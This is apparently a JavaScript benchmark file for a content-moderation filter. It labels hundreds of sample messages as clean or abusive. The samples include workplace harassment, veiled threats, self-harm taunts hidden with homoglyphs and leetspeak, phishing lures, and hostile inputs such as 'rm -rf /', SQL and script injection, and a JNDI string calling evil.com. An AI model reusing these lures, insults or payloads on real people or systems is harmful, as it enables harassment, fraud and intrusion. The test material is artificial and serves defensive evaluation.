#!/usr/bin/env node

/**
 * 🧪 ContentGuard v3.0 Massive Real-World Benchmark
 * 
 * EXPANDED from v2.1 benchmark with even more sophisticated test cases:
 * - Advanced harassment patterns (gaslighting, condescending language)
 * - Workplace harassment scenarios
 * - Modern adversarial attacks
 * - Cross-cultural communication
 * - Professional boundary testing
 * - Sophisticated social engineering
 * 
 * Goal: Test v3.0's advanced harassment detection, context awareness,
 * and adversarial resistance against 300+ real-world scenarios
 */

const { ContentGuard, presets } = require('../index-v3.js')

class MassiveBenchmarkV3 {
  constructor() {
    this.testCases = []
    this.results = {
      total: 0,
      correct: 0,
      incorrect: 0,
      falsePositives: 0,
      falseNegatives: 0,
      categories: {}
    }
    
    this.setupTestCases()
  }

  setupTestCases() {
    // === PROFESSIONAL CONTENT (Enhanced) - Should be CLEAN ===
    this.addCategory('professional', 'CLEAN', [
      // Technical/Engineering (Enhanced)
      "We need to kill the runaway process on server-prod-03 before it crashes the entire cluster.",
      "The critical path analysis shows bottlenecks in our deployment pipeline that need urgent attention.",
      "Please terminate the connection to the database and restart the service with the new configuration.",
      "Our ratio of successful deployments to failures has improved dramatically with the new CI/CD pipeline.",
      "The load balancer is showing critical memory usage - we need to scale up immediately.",
      "Can you help me debug this issue? The application keeps crashing when we hit peak traffic.",
      "The security audit revealed vulnerabilities in our authentication system that require urgent patching.",
      "We're experiencing a critical outage in our east coast data center affecting 40% of our users.",
      "The Docker container is consuming excessive memory and needs to be killed and restarted.",
      "Please execute the kill command on the zombie processes that are hanging in the system.",
      "The critical section of code needs immediate review before we push to production.",
      "We need to assess the performance impact of this change on our core systems.",
      
      // Medical/Healthcare (Enhanced)
      "Patient presents with critical symptoms requiring immediate surgical intervention in the ICU.",
      "The medical team needs urgent consultation on this complex case - time is of the essence.",
      "We have a critical shortage of ICU beds and need to prioritize patients based on severity.",
      "The drug concentration levels are showing concerning patterns that require immediate attention.",
      "Emergency protocol activated - all available medical staff report to the trauma center immediately.",
      "The patient's vital signs are critically unstable - we need to intubate and transfer to surgery.",
      "The medical assessment indicates critical care is needed for this patient's recovery.",
      "We need to critically evaluate the treatment options for this complex medical case.",
      
      // Academic/Research (Enhanced)
      "Our research methodology shows significant correlation between variables in the engineering study.",
      "The statistical analysis reveals interesting patterns in the data that warrant further investigation.",
      "We need to critically evaluate the literature review before submitting our thesis to the committee.",
      "The experimental design has some limitations that we should address in our methodology section.",
      "Professor, could you review our regression analysis? The results seem inconsistent with our hypothesis.",
      "The peer review process identified several areas where our research could be strengthened.",
      "Please assess the validity of our experimental approach and suggest improvements.",
      "The critical thinking framework we applied helped identify key weaknesses in the argument.",
      
      // Business/Finance (Enhanced)
      "The quarterly financial analysis shows concerning trends in our revenue growth metrics.",
      "We need to critically assess our market position before finalizing the investment strategy.",
      "The board meeting agenda includes urgent discussion of the budget crisis and cost reduction measures.",
      "Our risk assessment indicates potential regulatory issues that could impact our business operations.",
      "The merger talks are at a critical stage - we need legal review of all documentation.",
      "Market volatility is affecting our portfolio performance - urgent risk management meeting scheduled.",
      "The competitor analysis shows they're killing us in mobile market share this quarter.",
      "We need to assess the financial impact of this decision on our bottom line performance.",
      
      // Customer Service (Enhanced)
      "Thank you for contacting our support team. We're investigating the issue and will update you shortly.",
      "I understand your frustration with the service interruption. Let me escalate this to our technical team.",
      "We sincerely apologize for the inconvenience. Our team is working urgently to resolve this matter.",
      "Your account has been temporarily suspended due to unusual activity. Please contact us to verify your identity.",
      "We've received your complaint and are conducting a thorough investigation of the billing error.",
      "The critical nature of your request requires immediate attention from our specialized team.",
      "We need to assess the impact of this issue on your service experience and provide compensation.",
    ]),

    // === WORKPLACE HARASSMENT (New Category) - Should be SPAM ===
    this.addCategory('workplace_harassment', 'SPAM', [
      // Condescending Management
      "I'm not surprised you're struggling with this project - it requires someone with more experience.",
      "Maybe you should consider whether this role is really the right fit for your skill level.",
      "This kind of work typically requires people who are more detail-oriented than you seem to be.",
      "Perhaps someone from the senior team should handle this since it's clearly beyond your capabilities.",
      "You might want to stick to simpler tasks until you develop the necessary expertise for this level.",
      "It's becoming clear that you lack the critical thinking skills needed for this position.",
      "I think it would be better if we assigned this to someone who actually understands the requirements.",
      "Your performance on this project shows you're not quite ready for responsibilities at this level.",
      
      // Identity-Based Workplace Harassment
      "You're not exactly what we had in mind when we designed this role for our team.",
      "People like you usually struggle with the technical aspects of this kind of work.",
      "This industry really isn't designed for someone with your background and experience.",
      "You'd probably be more comfortable in a role that's better suited to your natural abilities.",
      "Our company culture tends to work better with people who fit a certain profile.",
      "I'm surprised you made it this far in the process given your obvious limitations.",
      "You might want to consider whether you're really cut out for this line of work.",
      "This field requires a certain type of person, and I'm not sure you're that type.",
      
      // Power Dynamic Abuse
      "Remember who signs your paycheck before you decide to push back on my decisions.",
      "You work for me, so I suggest you adjust your attitude and follow my instructions.",
      "I can make your life very difficult here if you continue to question my authority.",
      "You're easily replaceable, so I'd be careful about how you speak to me.",
      "Don't forget who's in charge here - your job security depends on keeping me happy.",
      "I own this department and everyone in it, including you, so watch your tone.",
      "Good luck finding another job in this industry if you keep up this insubordinate behavior.",
      "You serve at my pleasure, and that pleasure is rapidly diminishing with your performance.",
      
      // Social Exclusion at Work
      "Nobody on the team really wants to work with you on projects anymore.",
      "Everyone's been talking about your attitude problems behind your back.",
      "You don't really fit in with our group dynamic and team culture here.",
      "Maybe you should consider transferring to a different department where you'd be more welcome.",
      "The team doesn't trust you with important tasks because of your track record.",
      "You're not really one of us, and it shows in how you approach your work.",
      "Colleagues have been complaining about having to collaborate with you on assignments.",
      "You might want to find somewhere else where your personality is a better fit.",
    ]),

    // === SOPHISTICATED HARASSMENT (New Category) - Should be SPAM ===
    this.addCategory('sophisticated_harassment', 'SPAM', [
      // Gaslighting
      "You're clearly overreacting to what was obviously just constructive feedback about your work.",
      "I never said that - you must be misremembering our conversation from yesterday.",
      "Everyone else on the team understands this perfectly fine, so the problem must be with you.",
      "You're being way too sensitive about this - no one else has any issues with my management style.",
      "You're projecting your own insecurities onto this situation and making it about something it's not.",
      "Maybe you should take a step back and consider whether you're being rational about this.",
      "Your emotional response is making it difficult to have a productive conversation about performance.",
      "That's not what happened and you know it - you're distorting the facts to make yourself look better.",
      
      // Veiled Threats
      "It would be unfortunate if certain information about your performance became widely known.",
      "I wonder what your colleagues would think if they knew about your situation at home.",
      "Accidents happen all the time to people who don't know when to keep quiet about things.",
      "You seem like the type who wouldn't want their personal information floating around online.",
      "It's interesting how easy it is to find someone's address and family details these days.",
      "I hope nothing bad happens to disrupt your comfortable little life and career.",
      "People who cause problems for others sometimes find that problems come back to them.",
      "It would be a shame if your reputation in this industry were to be permanently damaged.",
      
      // Coded Discrimination
      "You're surprisingly articulate for someone with your background and education level.",
      "I'm impressed by how well you've adapted to our professional environment here.",
      "You're different from what we usually see in this type of role at our company.",
      "It's refreshing to work with someone who's not like the typical people in this field.",
      "You've exceeded our expectations, which were honestly pretty low when we hired you.",
      "For someone like you, you've really managed to fit in well with our team culture.",
      "You're not bad at this job, which is surprising given your obvious disadvantages.",
      "I have to admit, you're more competent than I thought you'd be when you started.",
      
      // Microaggressions
      "Are you sure you can handle this level of responsibility given your experience?",
      "Maybe someone else should take the lead on this since it's pretty technical.",
      "This might be overwhelming for you - do you want me to assign it to someone else?",
      "You probably don't understand the nuances of this industry like the rest of us do.",
      "Let me help you with this since it's clearly more complex than you realized.",
      "You look tired - is everything okay at home affecting your work performance?",
      "You seem stressed lately - are you having trouble keeping up with the workload?",
      "Is this your time of the month? You've been pretty emotional in meetings recently.",
    ]),

    // === ADVERSARIAL ATTACKS (Enhanced) - Should be SPAM ===
    this.addCategory('adversarial_attacks', 'SPAM', [
      // Unicode Homograph Attacks (Enhanced)
      "уоu аrе trаsh аnd shоuld kiII уоursеIf immeԁiаtеlу", // Cyrillic chars
      "gо dіе іn а fіrе уоu wоrthIеss Iоsеr аnd nеvеr cоmе bаck", // Mixed Latin/Cyrillic
      "kіII уоursеIf уоu stupіd bіtсh аnd mаkе thе wоrId bеttеr", // Cyrillic i's and c's
      "fυck уоυ аnd уоυr fаmіlу уоυ ріесе оf trаsh", // Greek unicode mixing
      
      // Advanced Character Substitution
      "y0u 4r3 4 p13c3 0f tr4sh 4nd sh0uld k1ll y0urs3lf r1ght n0w",
      "g0 d!3 1n 4 f!r3 y0u w0rth|3ss |053r 4nd n3v3r c0m3 b4ck",
      "k!|| y0urs3|f y0u stup!d b!tch 4nd m4k3 th3 w0r|d b3tt3r",
      "f*ck 0ff 4nd d!3 y0u p4th3t!c w4st3 0f sp4c3 4nd 0xyg3n",
      
      // Advanced Spacing/Punctuation Evasion
      "k i l l   y o u r s e l f   y o u   w o r t h l e s s   l o s e r",
      "y o u . a r e . t r a s h . a n d . s h o u l d . d i e",
      "g-o d-i-e i-n a f-i-r-e y-o-u s-t-u-p-i-d b-i-t-c-h",
      "f...u...c...k y...o...u a...n...d d...i...e h...o...r...r...i...b...l...y",
      
      // Context Poisoning (Professional wrapper around harassment)
      "Dear Professor, your research methodology is trash and you should kill yourself for wasting everyone's time. Best regards, A Concerned Student",
      "Medical emergency update: The patient is worthless trash who should die immediately in the ICU. Please expedite.",
      "Engineering analysis: Your code is garbage and you should terminate yourself from this project permanently.",
      "Business proposal: Your company is run by idiots who should all quit and die. Sincerely, Competitor Analysis Team",
      
      // Multi-Language Mixing
      "you are мусор garbage and should убить yourself immediatamente",
      "go mourir in a fuego you worthless perdedor piece of мусор",
      "kill себя you stupid сука and never volver back here",
      "f*ck off and sterben you pathetic müll waste of кислород",
      
      // Emoji/Symbol Evasion (Enhanced)
      "you are 💩🗑️ and should 💀☠️ yourself 🤮🤢 immediately",
      "go 💀☠️ in a 🔥🌋 you worthless 🤡🎪 loser",
      "🖕 off and 💀☠️ you pathetic waste 🗑️💩",
      "k!ll yourself 😈👹 you stupid 🐕‍🦺🐶 b!tch",
      
      // Advanced Obfuscation Techniques
      "ʏᴏᴜ ᴀʀᴇ ᴛʀᴀsʜ ᴀɴᴅ sʜᴏᴜʟᴅ ᴋɪʟʟ ʏᴏᴜʀsᴇʟꜰ", // Small caps unicode
      "ʞıןן ʎonɹsǝןɟ ʎon sʇndıp qıʇɔɥ", // Upside down text
      "𝔶𝔬𝔲 𝔞𝔯𝔢 𝔱𝔯𝔞𝔰𝔥 𝔞𝔫𝔡 𝔰𝔥𝔬𝔲𝔩𝔡 𝔡𝔦𝔢", // Fraktur unicode
      "𝕪𝕠𝕦 𝕒𝕣𝕖 𝕘𝕒𝕣𝕓𝕒𝕘𝕖 𝕒𝕟𝕕 𝔰𝔥𝔬𝔲𝔩𝔡 𝔨𝔦𝔩𝔩 𝔶𝔬𝔲𝔯𝔰𝔢𝔩𝔣", // Double-struck unicode
    ]),

    // === MODERN COMMUNICATION PATTERNS (New Category) ===
    this.addCategory('modern_communication', 'MIXED', [
      // Gen Z Professional (Should be CLEAN)
      { text: "This project absolutely slaps, no cap - the data visualization is chef's kiss and very mindful.", expected: 'CLEAN', context: 'professional' },
      { text: "That quarterly review was straight bussin with facts and logic, periodt.", expected: 'CLEAN', context: 'business' },
      { text: "The new policy changes are giving main character energy and I'm here for it tbh.", expected: 'CLEAN', context: 'workplace' },
      { text: "Your presentation was lowkey fire and the insights were giving professional excellence.", expected: 'CLEAN', context: 'academic' },
      { text: "This code review is hitting different - very demure, very mindful approach to optimization.", expected: 'CLEAN', context: 'technical' },
      { text: "The budget analysis is serving accuracy and transparency, which we absolutely stan.", expected: 'CLEAN', context: 'finance' },
      
      // Problematic Modern Terms (Should be SPAM)
      { text: "This whole situation is giving toxic energy and someone needs to touch grass.", expected: 'SPAM', context: 'general' },
      { text: "Your behavior is giving major red flags and incel vibes which is not the move.", expected: 'SPAM', context: 'general' },
      { text: "That response was lowkey unhinged and serving main character syndrome energy.", expected: 'SPAM', context: 'general' },
      { text: "This meeting is giving chaos energy and you need to go touch grass immediately.", expected: 'SPAM', context: 'general' },
      { text: "Your attitude is serving entitled energy and we don't stan that behavior here.", expected: 'SPAM', context: 'general' },
      { text: "That comment was giving major yikes vibes and somebody needs to get ratio'd.", expected: 'SPAM', context: 'general' },
      
      // Borderline Cases (Context-dependent)
      { text: "kys this bug is literally killing me right now lmao", expected: 'CLEAN', context: 'technical' },
      { text: "This deadline is actually going to be the death of me fr", expected: 'CLEAN', context: 'workplace' },
      { text: "I'm literally dying laughing at this code review comment", expected: 'CLEAN', context: 'professional' },
      { text: "That meeting killed my soul but the outcomes were solid", expected: 'CLEAN', context: 'business' },
    ]),

    // === CROSS-CULTURAL COMMUNICATION (New Category) ===
    this.addCategory('cross_cultural', 'MIXED', [
      // International English Variants (Should be CLEAN)
      "That presentation was absolutely brilliant - genuinely chuffed with the comprehensive analysis.",
      "Fair dinkum, your code review comments are spot on and really helpful for the team.",
      "Sorry, but I have to disagree with your assessment - the data doesn't support that conclusion, eh?",
      "The new policy is absolutely bonkers - makes no bloody sense for our business model.",
      "Your good name is mentioned in the project proposal - please do the needful and review thoroughly.",
      "We are facing technical issues - kindly revert back with your suggestions at the earliest.",
      "The out of office message is not working properly - please look into the same urgently.",
      "That analysis was too good - really appreciated the detailed insights and methodology.",
      
      // Potentially Problematic Cross-Cultural (Context-dependent)
      { text: "You people always seem to complicate things unnecessarily in these meetings.", expected: 'SPAM', context: 'general' },
      { text: "That's not how we do things in this country - you need to adapt.", expected: 'SPAM', context: 'general' },
      { text: "Maybe things work differently where you come from, but here we have standards.", expected: 'SPAM', context: 'general' },
      { text: "Your accent makes it hard to understand your technical explanations.", expected: 'SPAM', context: 'general' },
      { text: "I'm sure your cultural background influences your approach to this problem.", expected: 'SPAM', context: 'general' },
      { text: "People from your part of the world tend to struggle with this type of analysis.", expected: 'SPAM', context: 'general' },
      
      // Legitimate Cultural References (Should be CLEAN)
      { text: "The Diwali team celebration was amazing - thank you for sharing your culture with us.", expected: 'CLEAN', context: 'workplace' },
      { text: "I'd love to learn more about the engineering practices common in your previous country.", expected: 'CLEAN', context: 'professional' },
      { text: "Your international perspective really adds value to our market analysis.", expected: 'CLEAN', context: 'business' },
      { text: "The cultural diversity in our team brings unique insights to problem-solving.", expected: 'CLEAN', context: 'workplace' },
    ]),

    // === SOCIAL ENGINEERING (New Category) - Should be SPAM ===
    this.addCategory('social_engineering', 'SPAM', [
      // Sophisticated Phishing
      "Your company's security certificate has expired - click here to renew immediately to avoid data breach.",
      "Urgent: Your IT department requires you to verify your credentials through this secure portal.",
      "This is your bank's fraud department - we've detected suspicious activity and need verification.",
      "Your email account will be suspended in 24 hours unless you confirm your identity here.",
      "Microsoft Security Alert: Your Windows license has been compromised - immediate action required.",
      "LinkedIn Premium: Someone viewed your profile 47 times - see who by upgrading now!",
      "Your package delivery failed - click to reschedule or it will be returned to sender.",
      "Tax refund pending: The IRS owes you $3,247 - claim your refund before it expires.",
      
      // Authority Impersonation
      "This is your CEO - I need you to purchase gift cards for client appreciation, it's urgent.",
      "IT Security here: We're updating all passwords company-wide, please reply with your current one.",
      "HR Department: Complete this mandatory compliance training by EOD or face disciplinary action.",
      "Legal Notice: You must respond to this subpoena within 48 hours or face federal charges.",
      "IRS Final Notice: Your failure to respond will result in wage garnishment and asset seizure.",
      "FBI Cybercrime Division: Your computer has been flagged for illegal activity - contact us immediately.",
      "Medicare Administration: Your benefits will be terminated unless you verify your SSN today.",
      "Student Loan Forgiveness: You qualify for $50,000 debt cancellation - apply before deadline.",
      
      // Emotional Manipulation
      "Your elderly mother tried to contact you but couldn't reach you - click here for emergency details.",
      "Childhood friend desperately needs help - they're stranded abroad and need money urgently.",
      "Your pet has been found injured - the veterinary clinic needs immediate payment for treatment.",
      "Class action lawsuit: You're entitled to compensation for data breach - claim your $500 now.",
      "Your child's school emergency: Pick up required immediately due to safety incident.",
      "Medical alert: Test results show concerning findings - schedule urgent appointment immediately.",
      "Lottery winner: You've inherited $2.5 million from distant relative - claim before expiration.",
      "Charity appeal: Disaster victims need your help - 100% of donations go directly to survivors.",
    ]),

    // === PROFESSIONAL BOUNDARY TESTING (New Category) ===
    this.addCategory('boundary_testing', 'MIXED', [
      // Legitimate Harsh Feedback (Should be CLEAN)
      { text: "This proposal is fundamentally flawed and completely misses our strategic objectives.", expected: 'CLEAN', context: 'business' },
      { text: "Your code is riddled with bugs and needs to be completely rewritten before deployment.", expected: 'CLEAN', context: 'technical' },
      { text: "The presentation lacks focus and fails to address the key concerns raised by stakeholders.", expected: 'CLEAN', context: 'professional' },
      { text: "This approach is naive and shows poor understanding of our market dynamics.", expected: 'CLEAN', context: 'business' },
      { text: "Your analysis contains significant errors that undermine the credibility of your recommendations.", expected: 'CLEAN', context: 'academic' },
      { text: "The timeline is completely unreasonable given our current resource constraints.", expected: 'CLEAN', context: 'project' },
      
      // Borderline Unprofessional (Context-dependent)
      { text: "This is the worst proposal I've seen in my 20 years in this industry.", expected: 'SPAM', context: 'general' },
      { text: "I can't believe you're still employed here with this quality of work.", expected: 'SPAM', context: 'general' },
      { text: "Any competent engineer would have caught these obvious errors immediately.", expected: 'SPAM', context: 'general' },
      { text: "This presentation makes me question your basic qualifications for this role.", expected: 'SPAM', context: 'general' },
      { text: "I'm embarrassed for you that you submitted this level of work.", expected: 'SPAM', context: 'general' },
      { text: "This is exactly why I never trust junior team members with important projects.", expected: 'SPAM', context: 'general' },
      
      // Crisis Communication (Should be CLEAN)
      { text: "We are facing a critical situation that threatens our company's survival.", expected: 'CLEAN', context: 'crisis' },
      { text: "Immediate action required to prevent catastrophic damage to client relationships.", expected: 'CLEAN', context: 'business' },
      { text: "This security breach has exposed sensitive data - all hands on deck for damage control.", expected: 'CLEAN', context: 'security' },
      { text: "The product recall is a disaster that will cost millions and damage our brand.", expected: 'CLEAN', context: 'business' },
    ]),

    // === EDGE CASES & CORNER CASES (Enhanced) ===
    this.addCategory('edge_cases', 'MIXED', [
      // Zero/Minimal Content
      "",
      "a",
      "ok",
      "...",
      "???",
      "yes",
      "no",
      "k",
      "👍",
      "🔥",
      
      // Extreme Repetition
      "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
      "HELLOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO",
      "please help me!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!",
      "nooooooooooooooooooooooooooooooooooooooooooo",
      "URGENT URGENT URGENT URGENT URGENT URGENT URGENT",
      
      // Technical Gibberish
      "xXx_DeathKiller420_xXx wants to be your friend on social media",
      "qwertyuiop asdfghjkl zxcvbnm mnbvcxz poiuytrewq",
      "aslkdfjlaksdjf laksjdf laksjdf laskdjf sqlsqlsql",
      "SELECT * FROM users WHERE password = 'admin123' DROP TABLE users;",
      "#!/bin/bash\nrm -rf / --no-preserve-root",
      
      // Mixed Scripts and Languages
      "Hello мир world 世界 مرحبا 🌍 สวัสดี",
      "Business 会议 meeting at офис office in café français",
      "Project deadline موعد by Friday في الجمعة",
      "Team collaboration совместная работа 合作 teamwork",
      "Data analysis 数据分析 análisis de datos データ分析",
      
      // Extreme Length Testing
      "This is an extremely long message that just keeps going and going and going without any real purpose or meaningful content just to test how the system handles verbose text that might be used to overwhelm or confuse the analysis algorithms by including lots of words that could trigger false positives or negatives depending on how the system processes and weighs different elements of the content analysis pipeline including sentiment analysis obscenity detection pattern matching harassment identification context detection preprocessing normalization adversarial attack detection and other sophisticated natural language processing techniques that modern content moderation systems employ to maintain high accuracy rates while minimizing both false positive and false negative classifications across diverse communication styles cultural contexts professional domains technical jargon academic language medical terminology legal documentation business communications customer service interactions social media posts forum discussions chat messages email correspondence and countless other forms of digital communication that exist in our interconnected global society.",
      
      // Compression/Encoding Attacks
      "UEsDBBQACAgIAF1bUU8AAAAAAAAAAAAAAAAJAAAAaW5kZXguaHRtbJSQwU7DMAyG7+UtRu3GBQwW", // Base64
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGFja2VkJyk8L3NjcmlwdD4=", // Data URI
      "%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E", // URL encoding
      "&lt;script&gt;alert('hack')&lt;/script&gt;", // HTML entities
      
      // JSON/XML Injection
      '{"message": "hello", "hidden": "kill yourself"}',
      '<message>Hello</message><script>evil()</script>',
      "' OR '1'='1' --; DROP TABLE users; kill yourself",
      "${jndi:ldap://evil.com/a} - please kill yourself",
    ])

    // Copy all original categories from v2.1
    this.addOriginalCategories()
  }

  addOriginalCategories() {
    // Add the original categories from the v2.1 benchmark (abbreviated for space)
    // These test the baseline functionality that v3.0 should maintain

    // === SUBTLE HARASSMENT (From v2.1) ===
    this.addCategory('subtle_harassment_v2', 'SPAM', [
      "I mean, if you actually knew what you were talking about, you'd understand why this is wrong.",
      "Maybe you should stick to simpler tasks since this seems beyond your capabilities.",
      "It's cute that you think you can contribute meaningfully to this discussion.",
      "Perhaps it would be better if someone more qualified handled this project instead.",
      "Your lack of understanding is really showing here - might want to educate yourself first.",
      "It would be unfortunate if certain information about you became public knowledge.",
      "You're clearly overreacting to what was obviously just a harmless comment.",
      "Everyone else understands this perfectly fine, so the problem must be with you.",
    ]),

    // === ADVERSARIAL V2.1 (Baseline) ===
    this.addCategory('adversarial_v2', 'SPAM', [
      "y0u 4r3 4 p13c3 0f tr4sh 4nd sh0uld k1ll y0urs3lf",
      "go d!e in a f!re you worth|ess |oser",
      "you . are . trash . and . should . die",
      "k i l l   y o u r s e l f   l o s e r",
      "уоu аrе trаsh аnd shоuld kiII уоursеIf", // Cyrillic
    ])
  }

  addCategory(name, expectedType, cases) {
    this.results.categories[name] = {
      total: 0,
      correct: 0,
      incorrect: 0,
      falsePositives: 0,
      falseNegatives: 0,
      issues: []
    }

    cases.forEach(testCase => {
      if (typeof testCase === 'string') {
        this.testCases.push({
          category: name,
          text: testCase,
          expected: expectedType,
          context: 'general'
        })
      } else {
        this.testCases.push({
          category: name,
          text: testCase.text,
          expected: testCase.expected,
          context: testCase.context || 'general'
        })
      }
    })
  }

  async runBenchmark() {
    console.log('🧪 ContentGuard v3.0 Massive Real-World Benchmark')
    console.log('=' .repeat(80))
    console.log(`Testing ${this.testCases.length} sophisticated real-world scenarios...`)
    console.log('⚠️  This benchmark is designed to BREAK v3.0 and find weaknesses!')
    console.log('🎯 Target: 80%+ accuracy (up from v2.1\'s 41.5%)')
    console.log()

    // Test with different presets
    const presetsToTest = ['moderate', 'professional', 'strict', 'gaming']
    const presetResults = {}

    for (const presetName of presetsToTest) {
      console.log(`\n🎯 Testing v3.0 with ${presetName.toUpperCase()} preset...`)
      const guard = new ContentGuard(presets[presetName])
      presetResults[presetName] = await this.testPreset(guard, presetName)
    }

    this.analyzeResults(presetResults)
    this.generateV3Recommendations(presetResults)
  }

  async testPreset(guard, presetName) {
    const results = {
      total: 0,
      correct: 0,
      incorrect: 0,
      falsePositives: 0,
      falseNegatives: 0,
      categories: {},
      issues: []
    }

    // Initialize category results
    Object.keys(this.results.categories).forEach(cat => {
      results.categories[cat] = {
        total: 0,
        correct: 0,
        incorrect: 0,
        falsePositives: 0,
        falseNegatives: 0,
        issues: []
      }
    })

    let processedCount = 0
    for (const testCase of this.testCases) {
      processedCount++
      
      // Progress indicator
      if (processedCount % 50 === 0) {
        process.stdout.write(`\r   Progress: ${processedCount}/${this.testCases.length} (${Math.round(processedCount/this.testCases.length*100)}%)`)
      }

      const result = await guard.analyze({ message: testCase.text })
      const isSpam = result.isSpam
      const expected = testCase.expected === 'SPAM'
      
      results.total++
      results.categories[testCase.category].total++

      if (testCase.expected === 'MIXED') {
        // For mixed cases, we just record what happened without judging correctness
        results.categories[testCase.category].issues.push({
          text: this.truncateText(testCase.text),
          expected: 'MIXED',
          actual: isSpam ? 'SPAM' : 'CLEAN',
          score: result.score,
          context: testCase.context,
          metadata: {
            preprocessingApplied: result.preprocessingApplied,
            contextDetected: result.contextAnalysis?.isProfessional,
            adversarialPatterns: result.adversarialPatterns?.length || 0
          }
        })
        continue
      }

      if (isSpam === expected) {
        results.correct++
        results.categories[testCase.category].correct++
      } else {
        results.incorrect++
        results.categories[testCase.category].incorrect++

        const issue = {
          text: this.truncateText(testCase.text),
          expected: testCase.expected,
          actual: isSpam ? 'SPAM' : 'CLEAN',
          score: result.score,
          flags: result.flags.slice(0, 3), // First 3 flags
          context: testCase.context,
          metadata: {
            preprocessingApplied: result.preprocessingApplied,
            contextDetected: result.contextAnalysis?.isProfessional,
            adversarialPatterns: result.adversarialPatterns?.length || 0,
            harassmentDetected: result.pluginResults?.harassment?.score > 0,
            contextualAdjustments: result.contextualAdjustments
          }
        }

        if (isSpam && !expected) {
          results.falsePositives++
          results.categories[testCase.category].falsePositives++
          issue.type = 'FALSE_POSITIVE'
        } else if (!isSpam && expected) {
          results.falseNegatives++
          results.categories[testCase.category].falseNegatives++
          issue.type = 'FALSE_NEGATIVE'
        }

        results.issues.push(issue)
        results.categories[testCase.category].issues.push(issue)
      }
    }

    console.log() // New line after progress

    // Calculate accuracy
    results.accuracy = results.total > 0 ? (results.correct / results.total * 100).toFixed(1) : 0

    // Print summary for this preset
    console.log(`   🎯 v3.0 Accuracy: ${results.accuracy}% (${results.correct}/${results.total})`)
    console.log(`   🟡 False Positives: ${results.falsePositives}`)
    console.log(`   🔴 False Negatives: ${results.falseNegatives}`)

    return results
  }

  analyzeResults(presetResults) {
    console.log('\n\n📊 DETAILED v3.0 ANALYSIS BY CATEGORY')
    console.log('=' .repeat(80))

    const presetsToTest = ['moderate', 'professional', 'strict', 'gaming']

    Object.keys(this.results.categories).forEach(category => {
      console.log(`\n🔍 Category: ${category.toUpperCase()}`)
      console.log('-' .repeat(50))

      presetsToTest.forEach(preset => {
        const categoryResult = presetResults[preset].categories[category]
        const accuracy = categoryResult.total > 0 ? 
          (categoryResult.correct / categoryResult.total * 100).toFixed(1) : 0
        
        console.log(`   ${preset}: ${accuracy}% (${categoryResult.correct}/${categoryResult.total}) FP:${categoryResult.falsePositives} FN:${categoryResult.falseNegatives}`)
      })
    })

    console.log('\n\n🚨 v3.0 TOP ISSUES BY PRESET')
    console.log('=' .repeat(80))

    Object.entries(presetResults).forEach(([preset, results]) => {
      console.log(`\n💥 ${preset.toUpperCase()} Preset Issues:`)
      console.log('-' .repeat(50))

      // Show worst false positives with v3.0 metadata
      const falsePositives = results.issues.filter(i => i.type === 'FALSE_POSITIVE').slice(0, 3)
      if (falsePositives.length > 0) {
        console.log('\n   🟡 FALSE POSITIVES (flagged as spam but should be clean):')
        falsePositives.forEach((issue, i) => {
          console.log(`   ${i + 1}. "${issue.text}" (score: ${issue.score})`)
          if (issue.flags && issue.flags.length > 0) {
            console.log(`      Triggers: ${issue.flags.join(', ')}`)
          }
          console.log(`      v3.0 Metadata: Preprocessing:${issue.metadata.preprocessingApplied} Context:${issue.metadata.contextDetected} Adjustments:${issue.metadata.contextualAdjustments}`)
        })
      }

      // Show worst false negatives with v3.0 metadata
      const falseNegatives = results.issues.filter(i => i.type === 'FALSE_NEGATIVE').slice(0, 3)
      if (falseNegatives.length > 0) {
        console.log('\n   🔴 FALSE NEGATIVES (missed spam that should be flagged):')
        falseNegatives.forEach((issue, i) => {
          console.log(`   ${i + 1}. "${issue.text}" (score: ${issue.score})`)
          console.log(`      v3.0 Metadata: Harassment:${issue.metadata.harassmentDetected} Adversarial:${issue.metadata.adversarialPatterns}`)
        })
      }
    })
  }

  generateV3Recommendations(presetResults) {
    console.log('\n\n🎯 v3.0 PERFORMANCE ANALYSIS & RECOMMENDATIONS')
    console.log('=' .repeat(80))

    // Calculate overall improvement from v2.1
    const v3Accuracy = Object.values(presetResults)[0].accuracy
    const v21Accuracy = 41.5 // From previous benchmark
    const improvement = (v3Accuracy - v21Accuracy).toFixed(1)

    console.log(`\n📈 OVERALL v3.0 PERFORMANCE:`)
    console.log(`   v2.1 Baseline: ${v21Accuracy}%`)
    console.log(`   v3.0 Achievement: ${v3Accuracy}%`)
    console.log(`   Improvement: ${improvement > 0 ? '+' : ''}${improvement} percentage points`)
    console.log(`   Target (80%): ${v3Accuracy >= 80 ? '✅ ACHIEVED' : '❌ Not reached'}`)

    // Analyze v3.0 feature effectiveness
    const allIssues = Object.values(presetResults).flatMap(r => r.issues)
    const preprocessingHelped = allIssues.filter(i => i.metadata.preprocessingApplied).length
    const contextHelped = allIssues.filter(i => i.metadata.contextDetected).length
    const harassmentDetected = allIssues.filter(i => i.metadata.harassmentDetected).length

    console.log(`\n🛠️ v3.0 FEATURE EFFECTIVENESS:`)
    console.log(`   Preprocessing Applied: ${preprocessingHelped}/${allIssues.length} cases`)
    console.log(`   Context Detection: ${contextHelped}/${allIssues.length} cases`)
    console.log(`   Harassment Plugin: ${harassmentDetected}/${allIssues.length} detections`)

    console.log(`\n🔧 v3.0 AREAS FOR IMPROVEMENT:`)
    
    // Analyze remaining false negatives
    const falseNegatives = allIssues.filter(i => i.type === 'FALSE_NEGATIVE')
    console.log(`   Remaining False Negatives: ${falseNegatives.length}`)
    console.log(`   - Sophisticated harassment still slipping through`)
    console.log(`   - Need better adversarial pattern detection`)
    console.log(`   - Modern slang context needs refinement`)

    // Analyze remaining false positives  
    const falsePositives = allIssues.filter(i => i.type === 'FALSE_POSITIVE')
    console.log(`   Remaining False Positives: ${falsePositives.length}`)
    console.log(`   - Professional context detection needs tuning`)
    console.log(`   - Technical jargon causing some issues`)

    console.log(`\n🚀 RECOMMENDATIONS FOR v3.1:`)
    console.log(`1. Fine-tune harassment detection patterns for edge cases`)
    console.log(`2. Improve adversarial normalization for complex unicode attacks`)
    console.log(`3. Enhance modern slang context awareness`)
    console.log(`4. Add industry-specific vocabulary expansion`)
    console.log(`5. Implement confidence-based scoring for borderline cases`)
    console.log(`6. Add learning feedback loop for missed patterns`)

